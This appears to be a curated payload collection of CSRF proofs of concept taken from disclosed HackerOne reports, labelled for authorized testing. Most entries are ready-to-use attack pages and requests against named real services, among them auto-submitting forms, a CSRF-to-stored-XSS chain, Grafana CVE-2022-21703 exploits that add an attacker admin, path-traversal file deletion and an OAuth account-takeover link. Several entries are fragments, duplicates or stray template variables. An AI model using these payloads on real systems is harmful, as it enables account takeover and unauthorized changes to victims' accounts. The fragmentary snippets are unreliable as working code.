# Cross-Site Request Forgery (CSRF)  -  curated payloads & PoCs

Snippets extracted from disclosed HackerOne writeups. For authorized testing only.

## 1. [#1183241](https://hackerone.com/reports/1183241)  -  Cross-Site Request Forgery (CSRF) to xss
*medium*

```http
POST /index.cfm?GO=DEALS HTTP/1.1
Host: dailydeals.mtn.co.za
Cookie: EBSAuthCookie=15302|||N; TS011bbda7=014f25e894c21e6b965792d5df17dd4ba82e1424b80a3aa2fbd660ae…
Content-Type: application/x-www-form-urlencoded
Content-Length: 150
Origin: https://dailydeals.mtn.co.za
Referer: https://dailydeals.mtn.co.za/index.cfm?GO=DEALS
```

## 2. [#850022](https://hackerone.com/reports/850022)  -  CSRF on launchpad.37signals.com OAuth2 authorization endpoint
*high*

```http
POST /authorization.json HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 168
Origin: null
Content-Type: application/x-www-form-urlencoded
Cookie: _beanstalk_uuid=

client_id={your-client-id}&type=web_server&redirect_uri={your-redirect-uri}&commit=
```

## 3. [#850022](https://hackerone.com/reports/850022)  -  CSRF on launchpad.37signals.com OAuth2 authorization endpoint
*high*

```http
POST /authorization/token HTTP/1.1
Host: launchpad.37signals.com
Cookie: _beanstalk_uuid=
Content-Type: application/x-www-form-urlencoded
Content-Length: 214

type=web_server&client_id={your-client-id}&redirect_uri={your-redirect-uri}&client_secret={your-client-secret}&code={authorization-code}
```

## 4. [#1637761](https://hackerone.com/reports/1637761)  -  CSRF in Importing CSV files [app.taxjar.com]
*low*

```http
POST / HTTP/1.1
Host: taxjar-prod-bucket.s3.amazonaws.com
Referer: https://app.taxjar.com/
Content-Type: multipart/form-data; boundary=---------------------------211004162938951800283798959588
Content-Length: 4343
Origin: https://app.taxjar.com

-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="utf8"

âœ“
-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="key"

uploads/e996ac74-689e-4fae-872b-16c537050062/${filename}
-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="acl"

bucket-owner-full-control
-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="policy"

eyJleHBpcmF0aW9uIjoiMjAyMi0wNy0xNVQyMjo1NzoxOVoiLCJjb25kaXRpb25zIjpbWyJzdGFydHMtd2l0aCIsIiR1dGY4IiwiIl0sWyJzdGFydHMtd2l0aCIsIiRrZXkiLCJ1cGxvYWRzL2U5OTZhYzc0LTY4OWUtNGZhZS04NzJiLTE2YzUzNzA1MDA2Mi8iXSx7IlgtQW16LUFsZ29yaXRobSI6IkFXUzQtSE1BQy1TSEEyNTYifSx7IlgtQW16LUNyZWRlbnRpYWwiOiJBS0lBVTJNR1NaQVVTWVhSR0dBTy8yMDIyMDcxNS91cy1lYXN0LTEvczMvYXdzNF9yZXF1ZXN0In0seyJYLUFtei1EYXRlIjoiMjAyMjA3MTVUMTI1NzE5WiJ9LHsiYnVja2V0IjoidGF4amFyLXByb2QtYnVja2V0In0seyJhY2wiOiJidWNrZXQtb3duZXItZnVsbC1jb250cm9sIn0seyJzdWNjZXNzX2FjdGlvbl9yZWRpcmVjdCI6Imh0dHBzOi8vYXBwLnRheGphci5jb20vY3N2X2ltcG9ydHMvdXBsb2FkX2NvbXBsZXRlIn0sWyJjb250ZW50LWxlbmd0aC1yYW5nZSIsMSw1MjQyODgwMF1dfQ==
-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="X-Amz-Signature"

cdf6518c0ff866ce94128a4b9b3836c2e367650c319c4a98d92e300474775b62
-----------------------------211004162938951800283798959588
Content-Disposition: form-data; name="X-Amz-Credential"
# … truncated …
# … truncated …
```

## 5. [#850022](https://hackerone.com/reports/850022)  -  CSRF on launchpad.37signals.com OAuth2 authorization endpoint
*high*

```http
POST /authorization.json HTTP/1.1
Host: launchpad.37signals.com
Content-Length: 168
Origin: null
Content-Type: application/x-www-form-urlencoded
```

## 6. [#1637761](https://hackerone.com/reports/1637761)  -  CSRF in Importing CSV files [app.taxjar.com]
*low*

```http
POST / HTTP/1.1
Host: taxjar-prod-bucket.s3.amazonaws.com
Referer: https://app.taxjar.com/
Content-Type: multipart/form-data; boundary=---------------------------211004162938951800283798959588
Content-Length: 4343
Origin: https://app.taxjar.com
```

## 7. [#577920](https://hackerone.com/reports/577920)  -  login csrf in analytics.mopub.com
*medium, $280*

```http
POST /login HTTP/1.1
Host: analytics.mopub.com
Content-Length: 37
Origin: https://analytics.mopub.com
Content-Type: application/json;charset=UTF-8
Referer: https://analytics.mopub.com/
Cookie: _ga=██████; _gid=███████; mp_mixpanel__c=0

>{"name":"username","pass":"password"}
```

## 8. [#1727221](https://hackerone.com/reports/1727221)  -  Improper CSRF token validation allows attackers to access victim's accounts linked to Hackerone
*high*

```http
POST /graphql HTTP/2
Host: tray.io
Content-Length: 512
Content-Type: application/json
Authorization: Bearer aad14176400b44bb97b703b4ae1077a5c84c3b7f97e34f5383643c1c8a22cdf4
Origin: https://hackerone.integration-configuration.com
Referer: https://hackerone.integration-configuration.com/

{"operationName":"CallConnector","variables":{"input":{"connector":"github","version":"2.2","operation":"raw_http_request","authId":"22583997-4aa0-4bb8-87cb-28326dc97868","input":"{\"method\":\"GET\",\"parse_response\":\"true\",\"include_raw_body\":\"false\",\"url\":{\"endpoint\":\"/user/repos?per_page=50&page=1&affiliation=owner%2Ccollaborator%2Corganization_member\"}}"}},"query":"mutation CallConnector($input: ConnectorCallInput!) {\n  callConnector(input: $input) {\n    output\n    __typename\n  }\n}\n"}
```

## 9. [#1727221](https://hackerone.com/reports/1727221)  -  Improper CSRF token validation allows attackers to access victim's accounts linked to Hackerone
*high*

```http
POST /graphql HTTP/2
Host: tray.io
Content-Length: 512
Content-Type: application/json
Authorization: Bearer aad14176400b44bb97b703b4ae1077a5c84c3b7f97e34f5383643c1c8a22cdf4
Origin: https://hackerone.integration-configuration.com
```

## 10. [#850022](https://hackerone.com/reports/850022)  -  CSRF on launchpad.37signals.com OAuth2 authorization endpoint
*high*

```http
POST /authorization/token HTTP/1.1
Host: launchpad.37signals.com
Cookie: _beanstalk_uuid=
Content-Type: application/x-www-form-urlencoded
```

## 11. [#994504](https://hackerone.com/reports/994504)  -  authenticity token not verfied leads to change business name
*medium, $1,900*

```http
POST /signup HTTP/1.1
Host: partners.shopify.com
Referer: https://partners.shopify.com/signup
Content-Type: application/x-www-form-urlencoded
Content-Length: 690
Cookie: █████

authenticity_token=2vAI2NSYAWswz76VP5oZOX9qsoS%2BriQxAkUstj53i1xLI59byffVldnssNEjtHqZKcM%2BQ1VRq5kheL5Vibf%2FTw%3D%3D&organization%5Bbusiness_name%5D=df&organization%5Bbusiness_email%5D=cforu%2B6%40wearehackerone.com&organization%5Bwebsite%5D=&address%5Baddress1%5D=fake&address%5Baddress2%5D=&address%5Bcity%5D=cairo&address%5Bcountry_code%5D=EG&address%5Bprovince_code%5D=C&address%5Bpostal_code%5D=123&signup_profile_form%5Bprimary_revenue_intent%5D=other&signup_profile_form%5Bcustom_primary_revenue_intent%5D=bug+bounty&signup_profile_form%5Bcustom_other_platforms%5D=&signup_profile_form%5Bother_platforms%5D%5B%5D=no_platform&partner_agreement_accepted=0&partner_agreement_accepted=1
```

## 12. [#565883](https://hackerone.com/reports/565883)  -  Bypass Email Verification -- Able to Access Internal Gitlab Services that use Login with Gitlab and Perform Check on email domain
*medium*

```http
POST /api/scim/v2/groups/YOUR_GROUP_NAME/Users HTTP/1.1
Host: gitlab.com
Content-Type: application/scim+json
Authorization: Bearer YOUR_SCIM_TOKEN
Content-Length: 291

{"externalId":"REPLACE_ME","active":null,"userName":"anyusernamewilldo","emails":[{"primary":true,"type":"work","value":"ANYGITLABEMAIL@gitlab.com"}],"name":{"formatted":"Test User","familyName":"User","givenName":"Test3"},"schemas":["urn:ietf:params:scim:schemas:core:2.0:User"],"meta":{"resourceType":"User"}}
```

## 13. [#1049360](https://hackerone.com/reports/1049360)  -  CSRF in changing users donation_settings [https://streamlabs.com/api/v6/viewer-portal/viewer-settings/donation_settings]
*medium*

```http
POST /api/v6/viewer-portal/viewer-settings/donation_settings HTTP/1.1
Host: streamlabs.com
Content-Type: application/json
Content-Length: 143
Cookie: Redacted

{"username":{"value":"shirley","autofill":false},"amount":{"value":null,"currency":"USD","autofill":true},"clips":{"isVisibleToPublic":true}}
```

## 14. [#1131473](https://hackerone.com/reports/1131473)  -  CSRF allows to test email forwarding
*low*

```html
<script>
for (i = 300; i < 350; i++){
var url = "https://hackerone.com/$program-id/security_email_forwarding/test_forwarding.json?id="+i;
var CSRF = new XMLHttpRequest();
CSRF.open("GET", url, true);
CSRF.withCredentials = 'true';
CSRF.send();
}
</script>
```

## 15. [#1923672](https://hackerone.com/reports/1923672)  -  Account takeover due to insufficient URL validation on RelayState parameter
*medium, $2,450*

```http
GET /2.0/repositories/%7B766210f9-9bec-4010-9f4d-917b06661c0c%7D HTTP/2
Host: api.bitbucket.org
Authorization: Bearer Txpo3AXXQZHlp....
```

## 16. [#1923672](https://hackerone.com/reports/1923672)  -  Account takeover due to insufficient URL validation on RelayState parameter
*medium, $2,450*

```http
GET /2.0/repositories/%7B766210f9-9bec-4010-9f4d-917b06661c0c%7D HTTP/2
Host: api.bitbucket.org
Authorization: Bearer Txpo3AXXQZHlp....

'''
```

## 17. [#1353103](https://hackerone.com/reports/1353103)  -  Drive-by arbitrary file deletion in the GDK via letter_opener_web gem
*medium, $750*

```javascript
function deleteFile() {
            const fileToDelete = fileInput.value;
            fileInput.value = "";

            const path = "%2e%2e%2f".repeat(20) + encodeURIComponent(fileToDelete);
            const url = `http://127.0.0.1:3000/rails/letter_opener/${path}`
            
            const form = new FormData()
            form.append("_method", "DELETE")
            return fetch(url, { method: 'POST', body: form, mode: "no-cors" });
        }
```

## 18. [#152013](https://hackerone.com/reports/152013)  -  CSRF in 'set.php' via age causes stored XSS on 'get.php' - http://www.rockstargames.com/php/videoplayer_cache/get.php'
*medium*

```html
<iframe style="display:none" name="csrf-frame" id="csrf-frame"></iframe><form method="POST" action="http://www.rockstargames.com/php/videoplayer_cache/set.php" target="csrf-frame" id="csrf-form" encType="application/x-www-form-urlencoded"><input type="text" name="age" value='<a href=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==>CLICK ME</a>' /></form><script>document.getElementById("csrf-form").submit();</script><script>var xssframe = document.getElementById('csrf-frame');xssframe.addEventListener("load", function() { window.location='http://www.rockstargames.com/php/videoplayer_cache/get.php'; }); </script>
```

## 19. [#1458236](https://hackerone.com/reports/1458236)  -  0-day Cross Origin Request Forgery vulnerability in Grafana 8.x .
*high*

```html
<html>
  <head></head>
  <body>
<h1>cross-origin-request-forgery POC</h1>
<div id=statusdiv></div>
<script>

var victim_instance = "<vic_instance>";

function log_status(msg) {
  //status logger.
  let com = document.getElementById('statusdiv')
  com.innerHTML += "<h2>" + msg + "</h2>"
}

function dashboard_poc() {
	log_status("[*] Creating Dashboard")
	var url = `${victim_instance}/api/dashboards/db`
	fetch(url,
		{
			method:"POST",
			mode:"no-cors",
			credentials:"include",
			headers: {
				"Content-Type": "text/plain; application/json"
			},
			body: JSON.stringify(
				{
					"dashboard": {
						"title": "grafana_csrf_0_day"
					}
				}
				)
		})
}

function invite_poc() {
	log_status("[*] Creating User")
	var url = `${victim_instance}/api/org/invites`
	fetch(url,
# … truncated …
```

## 20. [#293016](https://hackerone.com/reports/293016)  -  CSRF log victim into the attacker account
*high*

```http
POST /apiv1/ HTTP/1.1
Host: unikrn.com
Referer: https://unikrn.com/games/lol/afreeca-freecs-v-griffin---best-of-3/31638
Content-Type: application/json
Content-Length: 49
Cookie: ...

{"session_id":"ue9cpp0t2mitjpm0s45epj78l3kpig6j"}
```

## 21. [#1096123](https://hackerone.com/reports/1096123)  -  CSRF to XSS in /htdocs/modules/system/admin.php
*medium*

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://<YOUR IMPRESS CMS HOST>/htdocs/modules/system/admin.php?fct=mailusers" method="POST">
        <input type="hidden" name="mail&#95;to&#95;group&#91;&#93;" value="2" />
      <input type="hidden" name="mail&#95;lastlog&#95;min" value="" />
      <input type="hidden" name="mail&#95;lastlog&#95;max" value="" />
      <input type="hidden" name="mail&#95;idle&#95;more" value="" />
      <input type="hidden" name="mail&#95;idle&#95;less" value="" />
      <input type="hidden" name="mail&#95;regd&#95;min" value="" />
      <input type="hidden" name="mail&#95;regd&#95;max" value="" />
      <input type="hidden" name="mail&#95;fromname" value="ImpressCMS" />
      <input type="hidden" name="mail&#95;fromemail" value="impress&#64;notexist&#46;notexist" />
      <input type="hidden" name="mail&#95;subject" value="" />
      <input type="hidden" name="mail&#95;body" value="&#123;&#36;smarty&#46;version&#125;" />
      <input type="hidden" name="mail&#95;send&#95;to&#91;&#93;" value="mail" />
      <input type="hidden" name="mail&#95;submit" value="Send" />
      <input type="hidden" name="op" value="send" />
      <input type="hidden" name="mail&#95;start" value="0" />
      <input type="hidden" name="memberslist&#95;id&#91;&#93;" value="asdf&apos;&gt;&lt;&#47;a&gt;&lt;svg&#47;onload&#61;alert&#40;document.cookie&#41;&gt;" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
# … truncated …
```

## 22. [#152013](https://hackerone.com/reports/152013)  -  CSRF in 'set.php' via age causes stored XSS on 'get.php' - http://www.rockstargames.com/php/videoplayer_cache/get.php'
*medium*

```html
<script>var xssframe = document.getElementById('csrf-frame');xssframe.addEventListener("load", function() { window.location='http://www.rockstargames.com/php/videoplayer_cache/get.php'; }); </script>
```

## 23. [#233099](https://hackerone.com/reports/233099)  -  CSRF in Report Lost or Stolen Page https://www.starbucks.com/account/card
*medium*

```html
<script>
window.setTimeout( function () { document.forms.form1.submit()},1500);
window.setTimeout( function () { document.forms.form2.submit()},2000);  

</script>
```

## 24. [#233099](https://hackerone.com/reports/233099)  -  CSRF in Report Lost or Stolen Page https://www.starbucks.com/account/card
*medium*

```html
<html>
<head>
   <meta name="referrer" content="no-referrer"/>
</head>
<script language="JavaScript">
function abc()
{
window.open("https://www.starbucks.com/account/card/loststolen");
}
</script>
<body onload="abc();">
  <script>history.pushState('', '', '/')</script>
    <form id="form1" target="_bank" action="https://www.starbucks.com/account/card/loststolenzerobalance" method="POST">
      <input type="submit" value="Submit request" />
    </form>
<form id="form2" target="_bank" action="https://www.starbucks.com/account/card/loststolenzerobalance" method="POST">
      <input type="submit" value="Submit request" />
    </form>
<script>
window.setTimeout( function () { document.forms.form1.submit()},1500);
window.setTimeout( function () { document.forms.form2.submit()},2000);  

</script>
  </body>
</html>
```

## 25. [#170552](https://hackerone.com/reports/170552)  -  Slack integration setup lacks CSRF protection
*high, $2,500*

```http
GET https://hackerone.com/auth/slack HTTP/1.1
```

## 26. [#170552](https://hackerone.com/reports/170552)  -  Slack integration setup lacks CSRF protection
*high, $2,500*

```http
GET https://hackerone.com/auth/slack?CSRF_TOKEN=bdea53bd9a8c73bd983847 HTTP/1.1
```

## 27. [#1309435](https://hackerone.com/reports/1309435)  -  Widespread CSRF on authenticated POST endpoints
*high*

```http
PUT requests, particularly `PUT /api/user` (to update a user's phone number and account status), are not possible through this method. However, older browsers might not comply to CORS pre-flight requests and still allow a PUT request initiated by JavaScript on the attacker's site to go through.

## Steps To Reproduce:
```

## 28. [#1458236](https://hackerone.com/reports/1458236)  -  0-day Cross Origin Request Forgery vulnerability in Grafana 8.x .
*high*

```html
<html>
  <head></head>
  <body>
<h1>CSRF Login POC, you will be redirected in 20 seconds</h1>
<div id=statusdiv></div>
<script>

var attacker_instance = "<att_instance>";
var attacker_instance_username = "avnadmin";
var attacker_instance_password = "<att_password>";
var attacker_csrf_proxy = "<att_ssrf_url>";

var csrf_html = `
  <form enctype="text/plain" action="${attacker_instance}/login" method=POST>
  <input type="text" name='{"user":"${attacker_instance_username}","password":"${attacker_instance_password}","dummy":"' value='"}'>
  <input type="submit">
  </form>
  <svg onload=document.forms[0].submit()>
`;

function log_status(msg) {
  //status logger.
  let com = document.getElementById('statusdiv')
  com.innerHTML += "<h2>" + msg + "</h2>"
}

function create_iframe() {
  log_status("[*] Logging victim into our grafana instance");
  var iframe = document.createElement("iframe");
  iframe.hidden = true;
  iframe.srcdoc = csrf_html;
  document.body.appendChild(iframe);
  log_status("[+] Redirecting to our SSRF Payload");
}

function xmen() {
  //redirects to our datasource, where can serve the grafana 0-day.
  window.location = attacker_csrf_proxy;
}

# … truncated …
```

## 29. [#1466765](https://hackerone.com/reports/1466765)  -  monitoring.prow-canary.k8s.io is vulnerable to CVE-2022-21703 (Grafana 0-day)
*low, $100*

```javascript
const baseUrl = "https://monitoring.prow-canary.k8s.io";
const url = `${baseUrl}/api/org/invites`;
const name = "attacker";
const email = "attacker@example.com";
const data = {"name":name,"email":"","role":"Admin","sendEmail":false,"loginOrEmail":email};
const opts = {
  method: "POST",
  mode: "no-cors",
  credentials: "include",
  headers: {
    "Content-Type": "text/plain; json"
  },
  body: JSON.stringify(data)
};
fetch(url, opts);
```

## 30. [#381237](https://hackerone.com/reports/381237)  -  CSRF | Ban or unban users in broadcast's chat
*low*

```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form action="https://steamcommunity.com/broadcast/ajaxupdateusermute/" method="POST" target="csrf-frame" id="csrf-form">
<input type="hidden" name="broadcaststeamid" value="{STEAM ID}">
<input type="hidden" name="issuersteamid" value="{STEAM ID}">
<input type="hidden" name="chattersteamid" value="{USER'S STEAM ID TO UNBAN}">
<input type="hidden" name="bantype" value="0">
<input type="hidden" name="duration" value="0">
<input type="hidden" name="perm" value="0">
</form>
<script>document.getElementById("csrf-form").submit()</script>
<html>
<head>
    <title>Unban in chat - CSRF</title>
</head>

<body>
<h1>Somebody was unbanned silently :/</h1>
</body>
</html>
```

## 31. [#381237](https://hackerone.com/reports/381237)  -  CSRF | Ban or unban users in broadcast's chat
*low*

```html
<iframe style="display:none" name="csrf-frame"></iframe>
<form action="https://steamcommunity.com/broadcast/ajaxupdateusermute/" method="POST" target="csrf-frame" id="csrf-form">
<input type="hidden" name="broadcaststeamid" value="{STEAM ID}">
<input type="hidden" name="issuersteamid" value="{STEAM ID}">
<input type="hidden" name="chattersteamid" value="{USER'S STEAM ID TO BAN}">
<input type="hidden" name="bantype" value="1">
<input type="hidden" name="duration" value="0">
<input type="hidden" name="perm" value="1">
</form>
<script>document.getElementById("csrf-form").submit()</script>
<html>
<head>
    <title>Ban in chat - CSRF</title>
</head>

<body>
<h1>Somebody was banned silently :/</h1>
</body>
</html>
```

## 32. [#2041007](https://hackerone.com/reports/2041007)  -  Cross-Site Request Forgery
*high*

```bash
curl 'http://localhost:8080/settings/users/users' \
  -H 'Accept: */*' \
  -H 'Connection: keep-alive' \
  -H 'Content-Type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'Cookie: oc_sessionPassphrase=<placeholder1>; oclt1tejv3yd=<placeholder2>' \
  -H 'Origin: http://abc:8080' \
  --data-raw 'username=new_admin&groups%5B%5D=admin&password=a&email=test%40mail.com' \
  --compressed
```

## 33. [#1353103](https://hackerone.com/reports/1353103)  -  Drive-by arbitrary file deletion in the GDK via letter_opener_web gem
*medium, $750*

```ruby
def self.find(id)
      new(id: id)
    end

    def initialize(params)
      @id      = params.fetch(:id)
      @sent_at = params[:sent_at]
    end

    def delete
      FileUtils.rm_rf("#{LetterOpenerWeb.config.letters_location}/#{id}")
    end
```

## 34. [#1122408](https://hackerone.com/reports/1122408)  -  CSRF on /api/graphql allows executing mutations through GET requests
*high, $3,370*

```html
<script>document.getElementById("csrf-form").submit()</script>
```

## 35. [#931197](https://hackerone.com/reports/931197)  -  [socket.io] Cross-Site Websocket Hijacking
*high*

```html
<script src="/socket.io/socket.io.js"></script>
```

## 36. [#931197](https://hackerone.com/reports/931197)  -  [socket.io] Cross-Site Websocket Hijacking
*high*

```html
<script>
                var socket = io();
        </script>
```

## 37. [#1309435](https://hackerone.com/reports/1309435)  -  Widespread CSRF on authenticated POST endpoints
*high*

```html
<script>
      	document.forms[0].submit();
    </script>
```

## 38. [#534908](https://hackerone.com/reports/534908)  -  CSRF at https://chatstory.pixiv.net/imported
*medium, $500*

```html
<script>history.pushState('', '', '/')</script>
```

## 39. [#152013](https://hackerone.com/reports/152013)  -  CSRF in 'set.php' via age causes stored XSS on 'get.php' - http://www.rockstargames.com/php/videoplayer_cache/get.php'
*medium*

```html
<script>document.getElementById("csrf-form").submit();</script>
```

## 40. [#233099](https://hackerone.com/reports/233099)  -  CSRF in Report Lost or Stolen Page https://www.starbucks.com/account/card
*medium*

```html
<script language="JavaScript">
function abc()
{
window.open("https://www.starbucks.com/account/card/loststolen");
}
</script>
```

## 41. [#1122408](https://hackerone.com/reports/1122408)  -  CSRF on /api/graphql allows executing mutations through GET requests
*high, $3,370*

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <meta name="referrer" content="none">
    <meta name="referrer" content="no-referrer">
</head>
<body>
      <form action="https://gitlab.com/api/graphql/" id="csrf-form" method="GET">
        <input name="query" value="mutation CreateSnippet($input: CreateSnippetInput!) {  createSnippet(input: $input) {    errors    snippet {      webUrl      __typename    }    needsCaptchaResponse    captchaSiteKey    __typename  }}">
        <input name="variables" value='{"input":{"title":"Tesssst Snippet","description":"Hello World","visibilityLevel":"public","blobActions":[{"action":"create","previousPath":"readme.md","content":"reading this.md","filePath":"readme.md"}],"uploadedFiles":[],"projectPath":""}}'>
    </form>


    <script>document.getElementById("csrf-form").submit()</script>
</body>
</html>
```

## 42. [#170552](https://hackerone.com/reports/170552)  -  Slack integration setup lacks CSRF protection
*high, $2,500*

```
Location: https://slack.com/oauth/authorize
?client_id=2174110321.11522100978
&redirect_uri=https%3A%2F%2Fhackerone.com%2Fauth%2Fslack%2Fcallback
&response_type=code
&scope=incoming-webhook
&state=379fd8f1baa8d80516e2f706f025057ad0ce2cca0bbbd56c
```

## 43. [#850022](https://hackerone.com/reports/850022)  -  CSRF on launchpad.37signals.com OAuth2 authorization endpoint
*high*

```
<form action="https://launchpad.37signals.com/authorization.json" method="POST">
      <input type="hidden" name="client&#95;id" value="{your-client-id}" />
      <input type="hidden" name="client&#95;secret" value="" />
      <input type="hidden" name="type" value="web&#95;server" />
      <input type="hidden" name="redirect&#95;uri" value="{your-redirect-uri}" />
      <input type="hidden" name="commit" value="" />
      <input type="submit" value="Submit request" />
    </form>
```

## 44. [#931197](https://hackerone.com/reports/931197)  -  [socket.io] Cross-Site Websocket Hijacking
*high*

```html
<script src="/socket.io/socket.io.js"></script>
        <script>
                var socket = io();
        </script>
```

## 45. [#1309435](https://hackerone.com/reports/1309435)  -  Widespread CSRF on authenticated POST endpoints
*high*

```html
<html>
  <body>
    <form action="https://hackers.upchieve.org/api/calendar/save" method="POST">
        <input type="hidden" name="availability[Sunday][12a]" value="true" />
        <input type="hidden" name="availability[Sunday][1a]" value="true" />
		
		...
		
        <input type="hidden" name="availability[Saturday][11p]" value="true" />
        <input type="hidden" name="tz" value="Asia/Singapore" />
    </form>
    <script>
      	document.forms[0].submit();
    </script>
  </body>
</html>
```

## 46. [#1086752](https://hackerone.com/reports/1086752)  -  CSRF in changing password after using reset password link
*low*

```html
<script>document.forms[0].submit()</script>
```

## 47. [#593893](https://hackerone.com/reports/593893)  -  CSRF in generating developer api_key
*medium, $500*

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://api.fortmatic.com/v1/dashboard/api_user/keys/regenerate" method="POST" enctype="text/plain">
      <input type="hidden" name="&#123;&#125;" value="" />
      <input type="submit" value="Generate New Keys" />
    </form>
  </body>
</html>
```

## 48. [#1046630](https://hackerone.com/reports/1046630)  -  One Click Account takeover using Ouath CSRF bypass by adding Null byte %00 in state parameter on  www.streamlabs.com
*medium, $200*

```
<html>
<head>
<style>
h1 {text-align: center;}
p {text-align: center;}
div {text-align: center;}
</style>
</head>
<body>
<h1>One Click Account Takeover PoC By C0nquer0rs</h1>
<p>Click the button to go to the Streamlabs and check you're account settings.</p>
<h1><button onclick="document.location='https://streamlabs.com/auth?code=e5p67p5r6vjizvpl2fj756625zv8ra&scope=user_read&state=b33a75be1737978b4c5ea22f7bf53078c86256db-merge%00'">Click Me</button><h1>
</body>
</html>
```

## 49. [#1668489](https://hackerone.com/reports/1668489)  -  CSRF vulnerability allows disabling Gmail contacts link for user referrals
*medium*

```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://crm.na1.insightly.com/Users/GoogleDisable/2026462">
      <input type="hidden" name="&#95;pjax" value="&#35;main" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

## 50. [#1049360](https://hackerone.com/reports/1049360)  -  CSRF in changing users donation_settings [https://streamlabs.com/api/v6/viewer-portal/viewer-settings/donation_settings]
*medium*

```html
<html>
<title>JSON CSRF POC</title>
<center>
<h1> JSON CSRF POC </h1>
<body onload="document.createElement('form').submit.call(document.getElementById('myForm'))">
<form id="myForm" action=https://streamlabs.com/api/v6/viewer-portal/viewer-settings/donation_settings method=post enctype="text/plain" >
<input name='{"username":{"value":"shirley","autofill":false},"amount":{"value":null,"currency":"USD","autofill":true},"clips":{"isVisibleToPublic":true,"ignore_me":"' value='test"}}'type='hidden'>
</form>
</center>
</html>
```

## 51. [#2029753](https://hackerone.com/reports/2029753)  -  CSRF to delete a pet
*medium*

```html
<html>
  <body>
    <form action="████">
      <input type="submit" value="Submit request" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## 52. [#753386](https://hackerone.com/reports/753386)  -  No CSRF Protection in Resend Confirmation Email feature leads to Sending Unwanted Email in Victim's Inbox without knowing Victim's email address
*medium*

```html
<body onload="document.form.submit()">
<form name="form" method="POST" action="https://my.stripo.email/cabinet/stripeapi/v1/resendEmailConfirmation">
</form>
</body>
```

## 53. [#800356](https://hackerone.com/reports/800356)  -  [express-cart] Wide CSRF in application
*medium*

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://localhost:1111/admin/settings/discount/create" method="POST">
      <input type="hidden" name="code" value="CSRF&#45;CODE&#45;DEMO" />
      <input type="hidden" name="type" value="percent" />
      <input type="hidden" name="value" value="30" />
      <input type="hidden" name="start" value="21&#47;02&#47;2020&#32;14&#58;32" />
      <input type="hidden" name="end" value="22&#47;02&#47;2020&#32;14&#58;32" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

## 54. [#1458236](https://hackerone.com/reports/1458236)  -  0-day Cross Origin Request Forgery vulnerability in Grafana 8.x .
*high*

```
${victim_instance}
```

## 55. [#1458236](https://hackerone.com/reports/1458236)  -  0-day Cross Origin Request Forgery vulnerability in Grafana 8.x .
*high*

```
${attacker_instance}
```

## 56. [#1458236](https://hackerone.com/reports/1458236)  -  0-day Cross Origin Request Forgery vulnerability in Grafana 8.x .
*high*

```
${attacker_instance_username}
```

## 57. [#1458236](https://hackerone.com/reports/1458236)  -  0-day Cross Origin Request Forgery vulnerability in Grafana 8.x .
*high*

```
${attacker_instance_password}
```

## 58. [#931197](https://hackerone.com/reports/931197)  -  [socket.io] Cross-Site Websocket Hijacking
*high*

```json
{{random id}}
```

## 59. [#834366](https://hackerone.com/reports/834366)  -  Login CSRF vulnerability on hackerone.com
*low, $500*

```javascript
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="https://hackerone.com/users/sign_in" method="POST">
      <input type="hidden" name="user[email]" value="youremail" />
      <input type="hidden" name="user[password]" value="yourpassword" />
      <input type="hidden" name="user[remember_me]" value="1" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>
```

## 60. [#1086752](https://hackerone.com/reports/1086752)  -  CSRF in changing password after using reset password link
*low*

```html
<html> 
  <body>
    <form  action="https://demo.openmage.org/customer/account/resetpasswordpost/" method="POST">
      <input type="hidden" name="password" value="password123" />
      <input type="hidden" name="confirmation" value="password123" />
    </form>
   <script>document.forms[0].submit()</script>
  </body>
</html>
```

## 61. [#1010806](https://hackerone.com/reports/1010806)  -  [tumblr.com] CSRF in /svc/user/filtered_content
*low*

```html
<html>

  <!-- CSRF PoC - generated by Burp Suite Professional -->

  <body>

  <script>history.pushState('', '', '/')</script>

    <form action="https://www.tumblr.com/svc/user/filtered_content" method="POST">

      <input type="hidden" name="filtered&#95;content" value="pwd777" />

      <input type="submit" value="Submit request" />

    </form>

  </body>

</html>
```

## 62. [#1466765](https://hackerone.com/reports/1466765)  -  monitoring.prow-canary.k8s.io is vulnerable to CVE-2022-21703 (Grafana 0-day)
*low, $100*

```
${baseUrl}
```

## 63. [#1637761](https://hackerone.com/reports/1637761)  -  CSRF in Importing CSV files [app.taxjar.com]
*low*

```
${filename}
```

## 64. [#881855](https://hackerone.com/reports/881855)  -  Arbitrary change of blog's background image via CSRF
*medium*

```php
// Unused since 3.5.0.
add_action( 'wp_ajax_set-background-image', array( $this, 'wp_set_background_image' ) );

/**
 * @since 3.4.0
 * @deprecated 3.5.0
 */
public function wp_set_background_image() {
	if ( ! current_user_can( 'edit_theme_options' ) || ! isset( $_POST['attachment_id'] ) ) {
		exit;
	}

	$attachment_id = absint( $_POST['attachment_id'] );

	$sizes = array_keys(
		/** This filter is documented in wp-admin/includes/media.php */
		apply_filters(
			'image_size_names_choose',
			array(
				'thumbnail' => __( 'Thumbnail' ),
				'medium'    => __( 'Medium' ),
				'large'     => __( 'Large' ),
				'full'      => __( 'Full Size' ),
			)
		)
	);

	$size = 'thumbnail';
